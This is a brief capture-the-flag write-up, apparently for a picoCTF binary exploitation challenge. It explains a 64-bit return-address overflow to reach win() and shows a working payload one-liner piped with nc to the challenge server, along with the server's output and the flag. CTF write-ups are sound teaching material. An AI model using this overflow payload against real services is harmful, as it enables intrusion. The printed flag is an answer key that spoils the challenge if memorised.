@@ -1,0 +1,10 @@
+This is a classic overflow except we're dealing with a 64-bit binary. In order to overflow the return address, we need to overflow
+the buffer (32 bytes) plus RBP (8 bytes for a 64-bit pointer) and encode the address of win() as another 8-byte pointer.
+
+```
+> python3 -c "import sys; sys.stdout.buffer.write(b'A'*40+b'\x56\x12\x40\x00\x00\x00\x00\x00\n')" | nc mysterious-sea.picoctf.net 58707
+Welcome to the secure echo service!
+Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV@
+Thank you for using our service.
+picoCTF{3ch0_s3rv1c3_br34k5_5f4859dd}%
+```
